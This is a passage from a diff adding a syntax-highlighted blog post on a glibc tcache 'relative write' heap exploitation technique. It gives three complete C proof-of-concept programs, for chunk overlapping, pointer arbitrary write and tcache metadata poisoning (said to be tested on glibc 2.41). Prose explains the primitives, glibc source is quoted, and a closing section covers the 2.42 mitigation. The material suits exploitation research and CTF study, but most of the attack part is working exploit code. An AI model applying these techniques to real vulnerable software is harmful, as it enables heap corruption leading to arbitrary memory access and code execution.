+    <span class="c1">// ---------------------------------</span>
+    <span class="c1">// | Ex: Trigger chunk overlapping |</span>
+    <span class="c1">// ---------------------------------</span>
+    <span class="c1">// To see the counter arbitrary write in practice, let's assume that we want to write counter on p2-&gt;size and make chunk p2 </span>
+    <span class="c1">// a very large chunk, so that it overlaps chunk p3.   </span>
+    <span class="c1">// First of all, we need to compute delta, then put it into the formula we discussed to get nb.</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tcache_counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">-</span> <span class="mh">0x290</span><span class="p">;</span> 	<span class="c1">// Get tcache-&gt;counts	</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">delta</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)</span> <span class="o">-</span> <span class="n">tcache_counts</span><span class="p">;</span>
+
+    <span class="c1">// Based on the formula above: nb = 8*(delta+2)+16</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nb</span> <span class="o">=</span> <span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="n">delta</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="mi">16</span><span class="p">;</span>
+
+    <span class="c1">// That's it! Now we exactly know what chunk size we should request to trigger counter write on our target</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nb</span><span class="o">-</span><span class="mh">0x10</span><span class="p">);</span>	
+    
+    <span class="c1">// Trigger TCache relative write</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+    
+    <span class="c1">// Now lets see if p2's size is changed</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">p2_orig_size</span><span class="p">);</span>
+
+    <span class="c1">// Now we can free p2 and later recover it with a larger request</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10100</span><span class="p">);</span> 
+
+    <span class="c1">// Lets see if the new returned pointer equals p2 </span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">p2</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<h4 id="chunk-pointer-arbitrary-write">Chunk pointer arbitrary write</h4>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>	<span class="c1">// The chunk that we can overflow or have a UAF on</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>	<span class="c1">// The target chunk used to demonstrate chunk overlap</span>
+
+    <span class="c1">// -------------------------------------</span>
+    <span class="c1">// | Ex: Chunk pointer arbitrary write |</span>
+    <span class="c1">// -------------------------------------</span>
+    <span class="c1">// Now to further demonstrate the power of tcache-relative write, lets relative write a freeing chunk</span>
+    <span class="c1">// pointer into an arbitrary location. This can be used for tcache poisoning and fastbin corruption,  </span>
+    <span class="c1">// House of Lore, etc.</span>
+
+    <span class="c1">// Compute delta (The difference between &amp;p1-&gt;fd and &amp;tcache-&gt;entries)</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tcache_entries</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">-</span> <span class="mh">0x210</span><span class="p">;</span>  <span class="c1">// Compute &amp;tcache-&gt;entries</span>
+    <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">-</span> <span class="n">tcache_entries</span><span class="p">;</span>
+
+    <span class="c1">// Based on the formulas we discussed above: nb = 2*(delta+8)+16</span>
+    <span class="n">nb</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="n">delta</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="mi">16</span><span class="p">;</span> 
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nb</span><span class="o">-</span><span class="mh">0x10</span><span class="p">);</span> 
+
+    <span class="c1">// Trigger tcache relative write (Write freeing pointer into p1-&gt;fd)</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">p1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">p</span><span class="p">);</span>
+
+    <span class="c1">// tcache poisoning, fastbin corruption (&lt;2.32 only with tcache relative write), house of lore, etc....</span>
+<span class="p">}</span></code></pre></figure>
+
+<h4 id="tcache-metadata-poisoning">TCache metadata poisoning</h4>
+<p>So in this scenario, you have at least one tcache chunk in <code class="language-plaintext highlighter-rouge">tcache-&gt;entries</code>. Using the <em>arbitrary counter-write</em> primitive, you can increase the pointer’s value and set it on an arbitrary address, thus get a chunk from an arbitrary location. This location could be of shared libraries’ range or just somewhere on heap. It should be reminded that whenever <code class="language-plaintext highlighter-rouge">tcache_put</code> wants to increase the counter, it simply increments whatever is inside <code class="language-plaintext highlighter-rouge">tcache-&gt;counts[tc_idx]</code>; So this means if you want to get a chunk from somewhere on heap, you still do not need a heap leak; but if you want to get a chunk from somewhere in libc, you need both a heap leak and libc leak. This technique can also be used to create a double-free or UAF.</p>
+
+<p><strong>Note</strong>: To be able to freely determine the tcachebin pointer, along with <code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code>, you’re also required to write a large value on <code class="language-plaintext highlighter-rouge">mp_.tcache_count</code> to bypass the 
+<code class="language-plaintext highlighter-rouge">tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</code>
+check; otherwise you’re restricted to a range of [0,7] on the overwritting address.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// This has been tested on GLIBC 2.41</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>	<span class="c1">// The chunk that we have UAF on (Used for Step 1)</span>
+    
+    <span class="c1">// Create the victim tcache chunk as our target for metadata poisoning</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>        <span class="c1">// The address we want to get a chunk from</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">target</span> <span class="o">&gt;</span> <span class="n">victim</span><span class="p">);</span>
+
+    <span class="c1">// Now lets use the arbitrary counter-write primitive to change the value of tcache-&gt;entries[0]</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tcache_counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">-</span> <span class="mh">0x290</span><span class="p">;</span>    <span class="c1">// Get tcache-&gt;counts</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tcache_entry</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">-</span> <span class="mh">0x210</span><span class="p">;</span>   <span class="c1">// Compute tcache-&gt;entries[0]</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">delta</span> <span class="o">=</span> <span class="n">tcache_entry</span> <span class="o">-</span> <span class="n">tcache_counts</span><span class="p">;</span>
+
+    <span class="c1">// Based on the formula above: nb = 8*(delta+2)+16</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nb</span> <span class="o">=</span> <span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="n">delta</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="mi">16</span><span class="p">;</span>
+
+    <span class="c1">// Compute the distance between victim and our target</span>
+    <span class="kt">size_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">target</span> <span class="o">-</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">victim</span><span class="p">;</span>
+    
+    <span class="c1">// Create chunks for trigger multiple tcache relative writes </span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">**</span><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">diff</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">diff</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    	<span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nb</span><span class="o">-</span><span class="mh">0x10</span><span class="p">);</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>	<span class="c1">// Free for libc leak</span>
+
+    <span class="cm">/* VULNERABILITY */</span>
+    
+    <span class="c1">// --- Step 1: Write a huge value into mp_.tcache_bins and mp_.tcache_count ---</span>
+    <span class="c1">// You should have the ability to write a huge value on an arbitrary location; this doesn't necessarily</span>
+    <span class="c1">// mean a full arbitrary write. Writing any value larger than 64 would suffice.</span>
+    <span class="c1">// This could be done in a program-specific way, or by a UAF/Overflow in target program. By a UAF/Overflow,</span>
+    <span class="c1">// you can use techniques like largebin attack, fastbin_reverse_into_tcache and house of mind (fastbins).</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">mp_tcache_bins</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x938</span><span class="p">;</span>   <span class="c1">// Relative computation of &amp;mp_.tcache_bins</span>
+    <span class="o">*</span><span class="n">mp_tcache_bins</span> <span class="o">=</span> <span class="mh">0x7fffffffffff</span><span class="p">;</span>	<span class="c1">// Write a large value into mp_.tcache_bins</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">mp_tcache_count</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mp_tcache_bins</span><span class="o">+</span><span class="mi">16</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">mp_tcache_count</span> <span class="o">=</span> <span class="mh">0x555555555555</span><span class="p">;</span>	<span class="c1">// Write a large value into mp_.tcache_count (to bypass the tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count check)</span>
+
+    <span class="cm">/* END VULNERABILITY */</span>
+
+    <span class="c1">// To reach our desired pointer, we have to increment the tcachebin pointer multiple times.</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">diff</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+
+    <span class="c1">// Now, lets get it out. </span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">target</span><span class="p">);</span>
+
+    <span class="c1">// We've got two pointers to the same chunk!</span>
+<span class="p">}</span></code></pre></figure>
+
+<h4 id="is-combination-with-tcache-poisoningfastbin-corruption-possible">Is combination with tcache poisoning/fastbin corruption possible?</h4>
+<p>Yes, but on just two versions: 2.30 &amp; 2.31. In <code class="language-plaintext highlighter-rouge">&gt;=2.32</code>, the <code class="language-plaintext highlighter-rouge">e-&gt;next</code> pointer of a tcache chunk is <strong>mangled</strong>. The chunk pointers are saved in <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> <strong>unmangled</strong>, therefore, we cannot use the arbitrary pointer write primitive to simply poison an arbitrary tcache chunk. Here is the involving code from <code class="language-plaintext highlighter-rouge">GLIBC 2.32</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
+<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
+
+  <span class="cm">/* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */</span>
+  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span>
+
+  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">PROTECT_PTR</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
+  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
+  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>If you want to get a chunk from arbitrary location in the latest versions, you can use the overlapping chunk or tcache metadata poisoning tricks I discussed above.</p>
+<h3 id="patch-in-242-">Patch in 2.42 ?</h3>
+<p>It seems this technique is (almost) no longer applicable since <code class="language-plaintext highlighter-rouge">GLIBC 2.42</code>. This is because the TCache mechanism now separates tcache chunks into two kinds: small tcache chunks and large tcache chunks. The large ones (The ones that have a <code class="language-plaintext highlighter-rouge">tc_idx &gt;= 64</code>) are treated in a different way and there’s a second <code class="language-plaintext highlighter-rouge">tc_idx</code> computed for these kind of tcache chunks, which is done different from the classic <code class="language-plaintext highlighter-rouge">csize2tidx</code>. See <a href="https://elixir.bootlin.com/glibc/glibc-2.42/source/malloc/malloc.c#L3164"><code class="language-plaintext highlighter-rouge">large_csize2tidx</code></a>.</p>
+
+<p>Here’s the code tcache code in <code class="language-plaintext highlighter-rouge">__libc_free</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#if USE_TCACHE
+</span>  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_max_bytes</span> <span class="o">&amp;&amp;</span> <span class="n">tcache</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="cm">/* Check to see if it's already in the tcache.  */</span>
+      <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+
+      <span class="cm">/* Check for double free - verify if the key matches.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache_key</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">tcache_double_free_verify</span> <span class="p">(</span><span class="n">e</span><span class="p">);</span>
+
+      <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_SMALL_BINS</span><span class="p">))</span>
+	<span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">num_slots</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+	    <span class="k">return</span> <span class="n">tcache_put</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+	<span class="p">}</span>
+      <span class="k">else</span>
+	<span class="p">{</span>
+	  <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">large_csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span>
+	      <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span>
+              <span class="o">&amp;&amp;</span> <span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">num_slots</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+	    <span class="k">return</span> <span class="n">tcache_put_large</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+	<span class="p">}</span>
+    <span class="p">}</span>
+<span class="cp">#endif</span></code></pre></figure>
+
+<p>The thing that stops us here is not the fact that large and small tcache chunks are separated, but the third check on large chunks: <code class="language-plaintext highlighter-rouge">tcache-&gt;num_slots[tc_idx] != 0</code>. So if you want to bypass that restriction, you first have to make sure that value of <code class="language-plaintext highlighter-rouge">tcache-&gt;num_slots[tc_idx]</code> will not be zero. In that case, you still have the relative arbitrary write ability. I will extend this part and write about the possible solution to bypass this restriction soon.</p>
+
+<p>So that’s it guys. Any ideas or errors? You can reach me at: D4R30@protonmail.com</p>]]></content><author><name></name></author><category term="heap-exploit" /><summary type="html"><![CDATA[]]></summary></entry></feed>
